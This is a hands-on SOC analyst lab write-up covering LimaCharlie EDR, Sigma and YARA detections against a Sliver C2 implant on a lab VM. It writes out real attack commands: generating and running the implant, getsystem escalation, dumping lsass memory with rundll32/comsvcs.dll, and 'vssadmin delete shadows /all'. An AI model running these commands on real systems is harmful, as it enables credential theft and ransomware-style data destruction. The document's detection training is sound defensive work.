# So You Want To Be A SOC Analyst Lab by Eric Capuano 

## Objective

The purpose of the SOC analyst lab is to provide hands-on experience in setting up, configuring, and using security operations center (SOC) tools such as LimaCharlie EDR and Sliver C2 to monitor, detect, and respond to security threats. The lab aims to equip participants with practical skills in deploying endpoint detection and response (EDR) solutions, generating command and control (C2) implants, and analyzing security telemetry to enhance their threat detection and incident response capabilities.

### Skills Learned

  - Setting up LimaCharlie EDR on a Windows virtual machine
  - Configuring log shipping and ingestion for Sysmon event logs
  - Enabling and using Sigma rules for threat detection
  - Generating and deploying Sliver C2 implants
  - Establishing and interacting with C2 sessions
  - Analyzing process trees and network connections for suspicious activities
  - Performing basic forensic analysis on endpoint activities
  - Identifying and interpreting security telemetry data from EDR tools
  - Utilizing command-line interfaces for security tool configuration and management

### Tools Used

  - __LimaCharlie EDR:__ For endpoint detection and response, log shipping, and threat detection
  - __Sysmon:__ For generating detailed event logs
  - __Sigma:__ For rule-based threat detection
  - __Sliver C2:__ For generating and managing command and control implants
  - __Windows Virtual Machine:__ As the target environment for EDR and C2 deployment
  - __Command Prompt (Windows):__ For executing installation and interaction commands
  - __VirusTotal:__ For inspecting and analyzing suspicious executables
  - __EchoTrail:__ For familiarizing with common processes and identifying anomalies
  - __LOLBINs (Living Off the Land Binaries):__ For understanding legitimate binaries used for malicious purposes

## Step 1 - Install LimaCharlie

>What is Lima Charlie?
>LimaCharlie is a very powerful “SecOps Cloud Platform”. It not only comes with a cross-platform EDR agent, but also >handles all of the log shipping/ingestion and has a threat detection engine.

Firstly we need to go to 'https://app.limacharlie.io/signup' to sighn up for a free account

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/b9d0d6cb-c2d4-454b-ab07-7d907759bbca)

We're now loged in to LimaCharlie and i'm ready to create my first Sensor

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/62b51d1b-7b55-4f0b-9312-bd5d7826c003)

After clicking on the 'Add Sensor' blue button i'm going to selct the 'Endpoint' tab then choose 'Windows' and create a new endpoint called 'Windows VM - Lab' and use the x86-64(.exe) architecture.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a9a4f95a-216b-4e39-957e-5bc4efd67625)

From the desktop we need to open up and Administrative command prompt and cd to the downloads folder

```
cd C:\Users\sywtbsa\Downloads
```

Within this Downloads folder we need to paste in the download executable from the above screen shot with the above command line arguement.

```
lc_sensor.exe -i AAAABgAAAQsFAAAAIzcwMTgyY2Y2MzRjMzQ2YmQubGMubGltYWNoYXJsaWUuaW8AAAABEAIBuwAAAQwFAAAAIzcwMTgyY2Y2MzRjMzQ2YmQubGMubGltYWNoYXJsaWUuaW8AAAABEQIBuwAAAAiBAAAABQAAAAUHAAAAEGUza3YR90Uko4ZwDXxYIkQAAAAJBwAAABAmTAOr6UdDe51nKPOUKmqCAAAABAcAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAcDAAAAAAAAAAYDAAAAAAAAAQ4HAAABJjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOj7/FEdn93dn3eYTnAiKmqkyMz/I+HQp4xy66MyeWgsFI9mVPRYeJabtbySde22Z0QBuDK59304K76o5n9b47vAPFR1b5t+6kcTrXvoLaOTUeinh5W/eqovIUD+alsnRdJQsvB844m8XtizqwzDaforgATed/jAqQLWhr+PcC3rExjz27R0fAtj3Ph4CNYey5We1yUOnKjRKeHFdL9L87Twlsj8u9rwbYWGPKZT3xbqGBmMFKvjKbWHYo81Vcd56KoIiQ5m9BUCplGXqR5dIa8U318jIeSTxKCsx7R1jU125PPHwcAkwa9wjE/fQQBo9QULGZ81mFLK3CGroeRRYpkCAwEAAQ==
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d21dccb4-e18a-408b-93e0-9ae786dcfd1e)

Above is what you should now see.

Lets check the LimaCharlie web sensor

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/3d1fb6bf-b72c-42df-afc3-825491f1780f)

click Finish.

Now let’s configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry

We are going to select “Artifact Collection Service” under “Sensors” and click 'Add Artifact Collection Rule'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2bea3f30-5974-44fa-b268-0a909764f4d1)

Complete with the below
  1. Name: `windows-sysmon-logs`
  2. Platforms: `Windows`
  3. Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
  4. Retention Period: `10`

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/83fd9367-8d71-4908-a680-d2f82088c3bc)

LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR
agent. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we are about to enable largely depend on Sysmon logs as that is what most of them were written for.

Last step in this step is to turn on the open source Sigma ruleset to assist our detection effors.

Here is a link to the Sigma Github - https://github.com/SigmaHQ/sigma 

>__What is Sigma?__
>Sigma is a generic and open signature format that allows you to describe relevant log events in a straightforward >manner. The rule format is very flexible, easy to write and applicable to any type of log file.

Click on 'Add-ons' from the top right menu and then choose 'Extensions' from the left menu

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2644f3f6-e33a-403c-98da-e576dd72c2b8)

Then find 'ext-sigma' click on it then choose 'Subscribe'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/15ac0ac1-a0d3-4dbb-a207-9c9068100786)

Thats its for LimaCharlie onto step 2


---


## Step 2 - Prepare for Attack & Defend

#### Generate our C2 Implant

>What is Sliver C2?
>Sliver C2 is an open-source command and control (C2) framework developed by Bishop Fox. It's designed for use in >red teaming, penetration testing, and adversary simulation. It allows security professionals to control and >interact with compromised systems in a controlled and secure manner.

Fisrt we need to start the Sliver Client, we can do this by launching the Ubuntu from our desktop and entering a root shell

```
sudo su
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/ee6d3593-7efc-46db-b80d-c35ad4f3320a)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/79ae0ccd-bad1-4e84-9bad-730b99058653)

The Sliver server is always running in the background of the WSL Ubuntu system. You can confirm that it is running by calling

```
systemctl status sliver
```
If it stops running we can restart it with

```
systemctl start sliver
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/17f2c37c-8828-43e6-aed7-8c9b4b182d6b)

As we can see its active, lets launch it

```
sliver
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2ae44b32-241a-48b4-a94c-340f1906367d)

Now we need to start the HTTP listner, lets check to make sure its not already running. We can check by typing in 

```
jobs
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e00e82cf-c905-4e92-919d-5e29a34bfff4)

So its not started lets start the HTTP Listener with

```
http
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/847cdf22-00e2-47da-a1bd-948016112580)

Next we need to generate our C2 implant and drop it in to the Downloads folder, confirm the Sliver server now has an implant stored.

```
generate --http 172.25.114.254 --save /mnt/c/Users/sywtbsa/Downloads/
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/1ee0e93f-d2dd-4a86-9f0d-78580709a624)

As we can see from the above screen shot we now have our Payload created in the downloads folder 'ELECTRIC_INEVITABLE.exe'

#### Start a Command and Control Session

Now that the payload is on the Windows VM and the Sliver HTTP listener is running, we’re ready to execute the payload and establish our C2 session.

>__What is a C2 Session?__
>A C2 (Command and Control) session refers to an interactive communication channel established between a compromised device (such as a computer, server, or network device) and an attacker’s command and control server. This session allows the attacker to remotely control the compromised device, execute commands, transfer files, and conduct various malicious activities.

First we need to open an Administrative command prompt and run the following command. Within a few seconds we should see the session on our Sliver server

```
C:\Users\sywtbsa\Downloads\ELECTRIC_INEVITABLE.exe
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d9446ce4-17fd-4743-8028-7b94e54e81f8)

To verify the session on the Sliver server type

```
sessions
```

and to interact with thios session we can enter the below command which includes the session id.

```
use 8fbc4b3c
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/b1b36161-a1da-4e7d-b59a-586cc2ba7499)

We are now interacting directly with the C2 session on the Windows VM. Let’s run a few basic commands to get our bearing on the victim host.

Get basic info

```
info
```

Find out what user your implant is running as, and learn it’s privileges

```
whoami
```

Identify our implant’s working directory

```
pwd
```

Examine network connections occurring on the remote system. This command sometimes takes a little bit to run, be patient.

```
netstat
```

Identify running processes on the remote system

```
ps -T
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/942846d3-702e-44d3-aed6-dc9bd7bbbbb9)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/5466e465-a61b-4910-b3dd-9cb4786382b6)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/62953afb-fe2b-41bb-8875-cd7bea7eaa28)

Notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red. This is how attackers become aware of what security products a victim system may be using.


#### Observe EDR Telemetry So Far

>__What is EDR?__
>EDR stands for Endpoint Detection and Response. It is a cybersecurity technology designed to monitor, detect, and respond to security threats on endpoints, which include computers, mobile devices, and other network-connected devices.

Let get back onto LimaCharlie and check some basic features.

Click on 'Sensors' on the left menu then click on our active windows sensor and then select 'Processes' from the left menu.
Lets explore what we have in this window, we can hover over the icons to see what they are.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d962b66f-f540-4d59-8bec-36de340a0d07)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/f1f8ce30-d39d-4b4b-8a98-a33c4a9ea470) - Listening and active on network

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d080677f-72f6-4add-97f7-87a9de3d45a4) - Signed

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/79d649be-5271-48c0-a474-fe0b520a7820) - Listening on network

A note from Eric
>I can’t stress enough how important it is for an analyst to have
familiarity with the most common processes you’ll encounter on even a
healthy system. As we say at SANS, “you must know normal before you can
find evil.” For some helpful resources in “knowing normal”, check out
the “[Hunt Evil](https://www.sans.org/posters/hunt-evil/)” poster from SANS and sign up for a free account at [EchoTrail](https://www.echotrail.io/).
A process carrying a valid signature (Signed) is often (almost always)
going to be benign itself. However, even legitimate signed processes can be used to launch malicious processes/code (read up on [LOLBINs](https://lolbas-project.github.io/#)).
One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed. The circular green check mark indicates the process binary is signed/trusted.

As we can see our C2 Implant is not signed and is also active on the network

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a23526ff-012e-46cb-a13d-e3ad97ff46f0)

By clicking on the 3 dots on the left of the process we can bring up a menu item to easily see the detination IP this process is communicating with

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/6a63c6ab-bbe8-4279-8bc6-d729933f1237)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2efd11b6-5c21-455e-8748-77997ef628fa)

Next lets select 'Network' from the menu on the left and take a look at what we can see. We can search using ctrl+F and see if we can see our C2 Implant 'ELECTRIC_INEVITABLE.exe'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/ab8117e7-12de-4c59-9cb5-e04972c31fd3)

Next lets select 'File System' from the menu on the left and browse to where we know the Implant came from (C:\Users\sywtbsa\Downloads)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/811dd2b4-349b-4aa6-bc39-a7dbe459eda9)

Hovering over our payload a new menu with pop up, were going to select the '#' to inspect the hash of the suspicious executable by searching for it on VirusTotal

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a93fe536-6c7b-4a53-a1b3-39e104a4c6e7)

>__Pro Tip__: If the file is a common/well-known malware sample, you will know it right away.  However, “Item not found” on VT does not mean that this file is innocent, just that it’s never been seen before by VirusTotal. This makes sense because we just generated this payload ourselves, so of course it’s not likely to be seen by VirusTotal before. This is an important lesson for any analyst to learn — if you already suspect a file to be possible malware, but VirusTotal has never seen it before, trust your gut. This actually makes a file even more suspicious because nearly everything has been seen by VirusTotal, so your sample may have been custom-crafted/targeted which ups the ante a bit. In a mature SOC, this would likely affect the TLP of the IOC and/or case itself.

Next click on 'Timeline' from the menu on the left, This is a near real-time view of EDR telemetry + event logs streaming from this system.

Here we can see WEL - Windows event logs and others.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/148556e3-b43d-4f3c-880e-c0f2a39328c7)

Here we can filter this timeline with knows IOC's (indicators of compromise) such as the name of your implant or the known C2 IP address. If we filter and search back we should be able to see the moment our implant was created on the system.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/9eb89213-89ef-4318-9a6e-54a111115462)


---


## Step 3 - Let’s Get Adversarial

We're going to jump back into our Sliver C2 session launched in step 2 and do some shady stuff that we would want to be able to detect.

Let’s elevate our implant to a SYSTEM level process with the following commands

```
getsystem
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/88a39688-4877-4058-ad00-38498a46251f)

This will spawn a new C2 session on the VM running as 'System' Lets switch to this new session

```
use 0f245292
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/d69d9c11-1bf2-48ef-a93c-ee723f5fc277)

Lets verify we have System privileges

```
whoami
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a3db4f6b-8227-4afc-91c8-aacfef47dfe6)

Next, let’s do something adversaries love to do: steal credentials on a system. We’re going to dump the lsass.exe process from memory, a critical Windows process which holds sensitive information, such as credentials.. Read more about this technique here (https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/). We are going to use an “LOLBIN” (https://socprime.com/blog/what-are-lolbins/) (legitimate binary already on the system) to accomplish this. 

First, we need to identify the process ID of lsass.exe . Run the following command in your active C2 session

```
ps -e lsass.exe
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/3fc8c1b5-9f5e-4e5f-9b72-05aaea25b0a6)

Now, carrying forward the PID from the previous step, run the following command in the C2 session

```
execute rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 756 C:\\Windows\\Temp\\lsass.dmp full
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/ae561858-5c55-4ee7-b732-a5294a263a7f)

This will dump the remote process from memory, and save it to 'C:\Windows\Temp\lsass.dmp'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/022e548a-eb85-4bbf-b349-284e8900c439)

>We are not going to further process the lsass dump to extract credentials, but I’ll leave it as an exercise for the reader if you want to try your hand at it. https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz

#### Now Lets Detect It

Now that we’ve done something adversarial, let’s switch over to LimaCharlie to find the relevant telemetry. Since lsass.exe is a known sensitive process often targeted by credential dumping tools, any good EDR will generate events for this.

Were going to head back to LimaCharlie and look at Timeline which is where we left it, lets refresh it and see what we have. Filter by 'SENSITIVE_PROCESS_ACCESS' and There could be many of these, but we know we’re looking for rundll32.exe being involved in the activity, so add that to your search filter and click on any of the returned events.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/5d2be68b-8b96-465a-a1a7-7f89f423ba6f)

Now that we know what the event looks like when credential access occurred, we have what we need to craft a detection & response (D&R) rule that would alert anytime this activity occurs.
>link - https://doc.limacharlie.io/docs/documentation/ZG9jOjE5MzExMDE-detection-and-response-rules

Clicking on the Build a D&R rule icon 

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/89f25abe-2061-416b-84ae-8ae4c49e53c3)

We have 3 sections 'Detect', 'Respond' & 'Comment'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/dc19ea17-5f9c-4d9f-b078-c48b687564a8)

In the 'Detect' replace content with the below

```
event: SENSITIVE_PROCESS_ACCESS
op: and
rules:
  - op: ends with
    path: event/*/TARGET/FILE_PATH
    value: lsass.exe
  - not: true
    op: ends with
    path: event/*/SOURCE/FILE_PATH
    value: wmiprvse.exe
```

We’re specifying that this detection should only look at SENSITIVE_PROCESS_ACCESS events where the victim, or target process ends with lsass.exe - excluding a very noisy false positive in this VM, wmiprvse.exe

>For posterity let me state, this rule would be very noisy and need further tuning in a production environment, but for the purpose of this learning exercise, simple is better.

In the “Respond” section of the new rule, remove all contents and replace them with this

```
- action: report
  name: LSASS access
```

We’re telling LimaCharlie to simply generate a detection “report” anytime this detection occurs. For more advanced response capabilities, check out the docs (https://doc.limacharlie.io/docs/documentation/22ae79c4ab430-examples-detection-and-response-rules). We could ultimately tell this rule to do all sorts of things, like terminate the offending process chain, etc. Let’s keep it simple for now.

Now let’s test our rule against the event we built it for. Lucky for us, LimaCharlie carried over that event it provides a quick and easy way to test the D&R logic. 

Select 'Target Event' you can see this if you scroll down, Here you will see the raw event we observed in the timeline earlier. Scroll to the bottom of the raw event and click “Test Event” to see if our detection would work against this event.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2ec3a7d3-3493-401d-bc6c-6ce9adc492b1)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/dba33980-7f1d-4c19-99bb-2bffd01d7d5d)

We should now see the test outcome, notice that we have a “Match” and the D&R engine tells you exactly what it matched on.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e9b6de41-4533-466d-9369-b8af81095385)

Now we can scroll back to the top and save this rule, we can call it 'LSASS Accessed'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/73205c42-8d4b-4c2d-b6f6-ea9a72876fb2)


#### Let’s Be Bad Again, Now with Detections!

Were going to head back to Sliver and delete the previously dumped lsass process with the following Sliver C2 session command

```
execute cmd.exe /c del C:\\Windows\\Temp\\lsass.dmp
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/3c652ce8-0184-41f6-89d6-662c8b7519a6)

Now, we’re ready to rerun our LOLBIN attack to dump lsass from memory.

>__Tip__: you can press the “Up” arrow to go back through historic commands you ran in Sliver to repeat the same command as before.

After rerunning the command above, go to the “Detections” tab on the LimaCharlie main left-side menu. We should have detected a threat with the detection signature we just set up.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/f5f1b248-5219-4d0b-8bc0-2b7816b5b363)

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/b7d2271e-f1ac-49fb-a4ff-93875b872504)

Notice you can also go straight to the timeline where this event occurred by clicking “View Event Timeline” from the Detection entry.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/ae04b6d0-3521-47ba-94b2-3132e8ce661c)



---


### Part 4 - Blocking Attacks

So in Part 3 we learned that we can craft our own detection rules to identify the moment a threat unfolds on our Windows system, but wouldn’t it be great if we could block the threat rather than just generate an alert?

>Note From Eric
>Now let me first say, it’s critical that anytime you are writing a blocking rule that you properly baseline the environment for false positives else you could possibly cause some real problems in your environment. Baselining is another skillset any SOC analyst must master, and it can take time and diligence to do it right. Generally what this looks like is crafting an alert-only detection rule, letting it run for days or weeks, tuning it to eliminate all false positives, and then deploying the blocking version of that rule.

We are going to create a rule that would be very effective at disrupting a ransomware attack by looking for a predictable action that ransomware tends to take: deletion of volume shadow copies.

>__What are volume shadow copies?__
>Volume Shadow Copies provide a convenient way to restore individual files or even an entire file system to a previous state which makes it a very attractive option for recovering from a ransomware attack. For this reason, it’s become very predictable that one of the first signs of an impending ransomware attack is the deletion of volume shadow copies.
>link https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/

A basic command that would accomplish this

```
vssadmin delete shadows /all
```

This  command is not one that will be run often (if ever) in healthy environments (but baselining is still crucial as some back ups software and other applications may do funny stuff like this on occasion).
So we now have a prime candidate for a blocking rule: low false positive prevalence, high threat activity.

Lets jump back onto Sliver and to start we need to get into a system native command prompt

```
shell
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a7cb83ea-6dbb-4ab1-bc9e-fc3765841902)

In the new system shell, run the following command

```
vssadmin delete shadows /all
```

The output is not important as there may or may not be Volume Shadow Copies available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.

Lets jump back over to LimaCharlie

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/95f26e50-7a8f-4d32-ad68-150090435ef6)

Lets expand the detection and examine all of the metadata contained within the detection itself. One of the great things about Sigma rules is they are enriched with references to help you understand why the detection exists in the first place.

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/32948cf7-be34-4f93-b526-a5c793125182)

>One of the reference URLs contains a YARA signature written by Florian Roth that contains several more possible command lines that we’d want to consider in a very robust detection rule.
>https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/gen_ransomware_command_lines.yar

View the offending event in the Timeline to see the raw event that generated this detection

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/0183ace1-2b18-492d-8783-a8583903d7d9)

Lets set up a Detection & Response rule from this even

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/df219d50-680c-42cc-b9c0-2f2b6fa91b4c)

Add the following Response rule to the Respond section

```
- action: report
  name: vss_deletion_kill_it
- action: task
  command:
    - deny_tree
    - <<routing/parent>>
```

The “action: report” section simply fires off a Detection report to the “Detections” tab
The “action: [task](https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions#task)” section is what is responsible for killing the parent process responsible with [deny_tree](https://doc.limacharlie.io/docs/documentation/819e855933d6c-reference-commands#deny_tree) for the `vssadmin delete shadows /all` command.

Lets save this and call it 'vss_deletion_kill_it'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2f55038f-7300-40b2-9134-415495a47496)

#### Lets block it

Lets go back to our Sliver C2 session and run the Delete Volume Shadows command again

```
vssadmin delete shadows /all
```

Now to test if our D&R rule properly terminated the parent process of our implant, check to see if you still have an active system shell by rerunning the whoami command

```
whoami
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/9a898720-1c07-44a9-9fad-b17309d97e7c)

If our D&R rule worked successfully, the system shell will hang and fail to return anything from the whoami command, because the parent process was terminated.
This is effective because in a real ransomware scenario, the parent process is likely the ransomware payload or lateral movement tool that would be terminated in this case.

Lets check LimaCharlie 'Detections' and see if the rule fired

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/22adfe3b-ed51-45e5-8168-66cd1d157299)



---


## Part 5 - Automated YARA Scanning

The goal of this post is to take advantage of a more advanced capability of any good EDR sensor, to automatically scan files or processes for the presence of malware based on a YARA signature

>__What is YARA?__
>YARA is a tool primarily used for identifying and classifying malware based on textual or binary patterns. It allows researchers and security professionals to craft rules that describe unique characteristics of specific malware families or malicious behaviors. These rules can then be applied to files, processes, or even network traffic to detect potential threats. When analyzing a compromised system, YARA helps in sifting through large amounts of data to find malicious artifacts by matching them against a set of predefined rules. This ability to create customized detection signatures is particularly useful in threat hunting and incident response, enabling swift identification of known and even previously unknown malicious elements.
>YARA originated from the efforts of Victor M. Alvarez, a malware researcher. It was initially developed as an internal tool at his former employer, Hispasec Sistemas, which is behind the well-known VirusTotal service. The tool was designed to assist researchers in identifying and classifying malware samples based on textual or binary patterns. Due to its effectiveness and utility, YARA was later released as an open-source tool, and it quickly gained popularity in the cybersecurity community. Over the years, it has become a standard tool for malware research, threat hunting, and incident response, thanks to its flexibility and the active community that has grown around it.
>YARA originated from the efforts of Victor M. Alvarez, a malware researcher. It was initially developed as an internal tool at his former employer, Hispasec Sistemas, which is behind the well-known VirusTotal service. The tool was designed to assist researchers in identifying and classifying malware samples based on textual or binary patterns. Due to its effectiveness and utility, YARA was later released as an open-source tool, and it quickly gained popularity in the cybersecurity community. Over the years, it has become a standard tool for malware research, threat hunting, and incident response, thanks to its flexibility and the active community that has grown around it.
>There are many free and open source YARA scanners and rulesets. Read more about YARA from [VirusTotal](https://virustotal.github.io/yara/) or explore one of the many open source [YARA rulesets](https://github.com/Yara-Rules/rules). A solid premium ruleset is the one maintained by [Nextron systems](https://www.nextron-systems.com/valhalla/).

Lets prepare our LimaCharlie instance for detecting certain file system and process activities in order to trigger YARA scans.

__Add a YARA signature for the Sliver C2 payload__
Since we already know we’re dealing with the Sliver C2 payload, we can be more targeted in our exercise by using a signature specifically looking for Sliver. Lucky for us, the UK National Cyber Security Centre published some fantastic intel on Sliver, including YARA signatures and other useful detections. The only downside is they crammed it all into a PDF making it a little difficult to use without extracting it manually — which I’ve already done for you.

Within LimaCharlie, browse to “Automation” > “YARA Rules” and lets add a Yara Rule

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/339cf092-b06d-4303-bf47-92fb0a3d5864)

Were going to name the Rule 'Sliver' and paste in the below which you can get from: https://gist.githubusercontent.com/ecapuano/2c59ff1ea354f1aae905d6e12dc8e25b/raw/831d7b7b6c748f05123c6ac1a5144490985a7fe6/sliver.yara

```
rule sliver_github_file_paths_function_names {
  meta:
    author = "NCSC UK"
    description = "Detects Sliver Windows and Linux implants based on paths and function names within the binary"
  strings:
    $p1 = "/sliver/"
    $p2 = "sliverpb."
    $fn1 = "RevToSelfReq"
    $fn2 = "ScreenshotReq"
    $fn3 = "IfconfigReq"
    $fn4 = "SideloadReq"
    $fn5 = "InvokeMigrateReq"
    $fn6 = "KillSessionReq"
    $fn7 = "ImpersonateReq"
    $fn8 = "NamedPipesReq"
  condition:
    (uint32(0) == 0x464C457F or (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)) and (all of ($p*) or 3 of ($fn*))
}

rule sliver_proxy_isNotFound_retn_cmp_uniq {
  meta:
    author = "NCSC UK"
    description = "Detects Sliver implant framework based on some unique CMPs within the Proxy isNotFound function. False positives may occur"
  strings:
    $ = {C644241800C381F9B3B5E9B2}
    $ = {8B481081F90CAED682}
  condition:
    (uint32(0) == 0x464C457F or (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)) and all of them
}

rule sliver_nextCCServer_calcs {
  meta:
    author = "NCSC UK"
    description = "Detects Sliver implant framework based on instructions from the nextCCServer function. False positives may occur"
  strings:
    $ = {4889D3489948F7F94839CA????48C1E204488B0413488B4C1308}
  condition:
    (uint32(0) == 0x464C457F or (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)) and all of them
}
```

And click 'Save'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/9e31c70d-60c7-4f49-85db-e317375c06da)

Now, before we use these YARA rules, we want to setup a few generic D&R rules that will generate alerts whenever a YARA detection occurs.

Go to “Automation” > “D&R Rules” and create a new rule with the below in te 'Detect' block

```
event: YARA_DETECTION
op: and
rules:
  - not: true
    op: exists
    path: event/PROCESS/*
  - op: exists
    path: event/RULE_NAME
```

And the below in the 'Respond' block

```
- action: report
  name: YARA Detection {{ .event.RULE_NAME }}
- action: add tag
  tag: yara_detection
  ttl: 80000
```

And were going to save this rule as 'YARA Detection'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/6ccc0de0-bc04-4639-a43a-74ac60b82a45)

Lets create 1 last rule with the below in te 'Detect' block

```
event: YARA_DETECTION
op: and
rules:
  - op: exists
    path: event/RULE_NAME
  - op: exists
    path: event/PROCESS/*
```

And the below in the 'Respond' block

```
- action: report
  name: YARA Detection in Memory {{ .event.RULE_NAME }}
- action: add tag
  tag: yara_detection_memory
  ttl: 80000
```

And were going to save this rule as 'YARA Detection in Memory'

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/31ea44cd-33c8-430f-ab7b-47721698f66a)

#### Lets test our new YARA signature

Since we already know we have a Sliver implant sitting in the Downloads folder of our Windows VM, we can easily test our signature by initiating a manual YARA scan using the EDR sensor. This will give us a sanity check that all things are working up to this point.

In LimaCharlie, browse to the “Sensors List” and click on our Windows VM sensor then click on the 'Cosole' menu item on the left.

Run the following command to kick off a manual YARA scan of all files in the Downloads directory, looking for something that matches the Sliver YARA signature. Hit enter twice to execute this command

```
yara_scan hive://yara/sliver -r C:\Users\sywtbsa\Downloads
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/a8090823-9b30-4412-a8a0-c5be45bf69a8)

We can see below a positive hit on one of the signatures contained within the Sliver YARA rule

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/f4b4eb78-bdee-4d6c-9de8-f79f18ea6f7e)

Let confirm we also have a detection on the 'Detections' screen

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e38675d1-8fbe-46d6-9c07-6a4d445eb44c)

Lets automate this process!

#### Automate - YARA Scan downloaded EXEs

Browse to “Automation” > “D&R Rules” and create a new rule with the below in te 'Detect' block

Notice that this detection is simply looking for NEW .exe files to appear in any users Downloads directory.

```
event: NEW_DOCUMENT
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
  - op: ends with
    path: event/FILE_PATH
    value: .exe
```

And the below in the 'Respond' block

This response action generates an alert for the EXE creation, but more importantly, kicks off a YARA scan using the Sliver signature against the newly created EXE.

```
- action: report
  name: EXE dropped in Downloads directory
- action: task
  command: >-
    yara_scan hive://yara/sliver -f "{{ .event.FILE_PATH
    }}"
  investigation: Yara Scan Exe
  suppression:
    is_global: false
    keys:
      - '{{ .event.FILE_PATH }}'
      - Yara Scan Exe
    max_count: 1
    period: 1m
```

And were going to save this rule as 'YARA Scan Downloaded EXE'

